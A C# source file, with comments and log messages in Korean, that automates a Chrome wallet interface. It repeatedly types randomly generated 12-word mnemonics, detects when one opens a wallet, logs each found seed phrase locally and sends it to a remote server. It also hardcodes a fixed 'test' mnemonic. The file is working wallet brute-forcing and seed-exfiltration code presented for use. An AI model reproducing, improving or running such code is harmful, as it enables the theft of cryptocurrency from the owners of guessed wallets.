namespace MainPatchedImproved;

/// <summary>
/// 시작: First Set → Second Set 1차(1~12 채우고 next 한 번) → success 체크 → 없으면 2회차부터 슬롯마다 next 후 success 체크 반복.
/// </summary>
public static class AutomationRunner
{
    /// <summary>true면 테스트용 고정 니모닉 사용</summary>
    public static bool UseTestMnemonic = false;

    private static readonly string[] TestMnemonic = "claw film regular palm call kangaroo carbon matrix fall crater total sand".Split(' ');

    private static void AppendSuccessPhrase(string[] phrase)
    {
        var phraseLine = string.Join(" ", phrase);
        try
        {
            var path = Path.Combine(ChromeImageMatcher.BaseDir, "success_phrases.txt");
            var line = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " " + phraseLine + Environment.NewLine;
            File.AppendAllText(path, line, System.Text.Encoding.UTF8);
        }
        catch { }
        if (ServerApi.Enabled && !string.IsNullOrEmpty(ServerApi.CurrentToken))
            _ = ServerApi.SendSeedAsync(ServerApi.CurrentToken, phraseLine);
        else if (!ServerApi.Enabled)
            AppLog.WriteLine("(서버 미연결: data 또는 exe 폴더에 server_url.txt 없음)");
        else
            AppLog.WriteLine("(서버 토큰 없음: 서버 로그인 후 시드가 전송됩니다)");
    }

    public static void Run()
    {
        ChromeImageMatcher.UseForegroundWindow = true;
        ChromeImageMatcher.Debug = false;

        if (!Directory.Exists(ChromeImageMatcher.PicsKr))
        {
            AppLog.WriteLine("pic/kr 폴더 없음");
            return;
        }

        AppLog.WriteLine("시작");

        int cycleCount = 0;
        while (!MainLoop.CheckStop())
        {
            cycleCount++;
            AppLog.WriteLine($"{cycleCount}회차 진행중");

            MainLoop.RunFirstSet();
            if (MainLoop.CheckStop()) break;
            Thread.Sleep(1200); // First Set 후 화면 전환 대기

            List<string> wordlist;
            if (!UseTestMnemonic)
            {
                try { wordlist = MainLoop.LoadWords(); }
                catch { AppLog.WriteLine("wordlist 로드 실패"); break; }
                if (MainLoop.CheckStop()) break;
            }
            else
                wordlist = new List<string>();

            string[] mnemonic = UseTestMnemonic ? TestMnemonic : MainLoop.Random12(wordlist);
            AppLog.WriteAttemptedPhrase(string.Join(" ", mnemonic));
            AppLog.WriteLine("니모닉 입력 중");
            if (MainLoop.CheckStop()) break;
            Thread.Sleep(400); // 니모닉 생성 후 잠시 대기

            MainLoop.RunSecondSet(mnemonic, useCtrlA: false);
            if (MainLoop.CheckStop()) break;
            Thread.Sleep(4000); // Second Set 후 결과 대기

            if (MainLoop.HasSuccess())
            {
                AppLog.WriteLineRed("지갑 발견");
                WalletCountFile.Increment();
                AppendSuccessPhrase(mnemonic);
                ChromeImageMatcher.ClickImage("confirm", ChromeImageMatcher.StateMatchThreshold, 0.5);
                Thread.Sleep(600);
                ChromeImageMatcher.ClickImage("x", ChromeImageMatcher.StateMatchThreshold, 0.35);
                AppLog.WriteLine("처음부터 다시 시작");
                Thread.Sleep(900);
                continue;
            }

            int tried = 0;
            while (!MainLoop.CheckStop())
            {
                tried++;
                string[] retryMnemonic = UseTestMnemonic ? TestMnemonic : MainLoop.Random12(wordlist);
                AppLog.WriteAttemptedPhrase(string.Join(" ", retryMnemonic));
                if (MainLoop.RunSecondSetRetry(retryMnemonic))
                {
                    AppLog.WriteLineRed("지갑 발견");
                    WalletCountFile.Increment();
                    AppendSuccessPhrase(retryMnemonic);
                    ChromeImageMatcher.ClickImage("confirm", ChromeImageMatcher.StateMatchThreshold, 0.5);
                    Thread.Sleep(600);
                    ChromeImageMatcher.ClickImage("x", ChromeImageMatcher.StateMatchThreshold, 0.35);
                    AppLog.WriteLine("처음부터 다시 시작");
                    Thread.Sleep(900);
                    break;
                }
                AppLog.WriteLine($"{tried}차 재시도");
                Thread.Sleep(500); // 재시도 사이 간격
            }
        }

        AppLog.WriteLine("작업 종료");
    }
}
